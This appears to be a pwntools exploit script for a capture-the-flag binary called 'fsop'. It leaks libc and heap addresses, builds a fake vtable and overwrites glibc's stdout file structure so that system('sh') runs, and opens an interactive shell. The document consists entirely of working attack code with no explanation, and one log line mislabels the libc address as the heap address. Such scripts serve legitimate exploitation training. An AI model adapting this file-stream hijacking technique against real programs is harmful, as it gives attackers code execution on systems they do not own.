#!/usr/bin/env python3
from pwn import *
from os import getcwd

# -------------------------- INFO -------------------------- #
# Arch:       amd64-64-little
# RELRO:      Full RELRO
# Stack:      Canary found
# NX:         NX enabled
# PIE:        PIE enabled
# RPATH:      b'.'
# Stripped:   No

# ------------------------- TARGET ------------------------- #
exe = context.binary = ELF(args.EXE or "./fsop")
rop = ROP(exe)

# ------------------------- REMOTE ------------------------- #
host = args.HOST or "127.0.0.1"
port = int(args.PORT or 1337)

# -------------------------- LIBC -------------------------- #
libc = ELF(args.LIBC or "./glibc/libc.so.6")
rop_libc = ROP(libc)

# -------------------------- START ------------------------- #
gdbscript = """
c
"""

if args.REMOTE:
    p = remote(host, port)
else:
    p = process(exe.path)
    if args.DBG:
        gdb.attach(p, gdbscript=gdbscript)

# ------------------------- EXPLOIT ------------------------ #


def arbwrite(address: int, data: bytes):
    info(f"Writing 0x{len(data):x} bytes of data to 0x{address:x}")
    p.sendlineafter(b"> ", b"1")
    p.sendlineafter(b"Address: ", hex(address).encode())
    p.sendlineafter(b"Amount: ", hex(len(data)).encode())
    p.sendafter(b"Data: ", data)


# Leak LIBC address
libc_leak = int(p.recvline_startswith(b"puts").decode(errors="ignore")[14:], 16)
info(f"LIBC leak: 0x{libc_leak:x}")

# Calculate LIBC address
libc.address = libc_leak - libc.sym.puts
info(f"LIBC address: 0x{libc.address:x}")

# Leak HEAP address
heap_leak = int(p.recvline_startswith(b"HEAP").decode(errors="ignore")[11:], 16)
info(f"HEAP leak: 0x{heap_leak:x}")

# Calculate HEAP address
heap_address = heap_leak & ~0xFFF
info(f"HEAP address: 0x{libc.address:x}")

# Writing fake vtable
info("Writing fake vtable")
fake_vtable_addr = heap_leak + 0x700
arbwrite(fake_vtable_addr + 0x38, p64(libc.sym.system))

# Patch stdout vtable
info("Patching stdout vtable")
arbwrite(libc.sym._IO_2_1_stdout_ + 216, p64(fake_vtable_addr))

# Patch stdout flags
info("Patching stdout _flags")
arbwrite(libc.sym._IO_2_1_stdout_, b"sh\x00")

# Trigger RCE
p.sendlineafter(b"> ", b"2")

p.interactive()
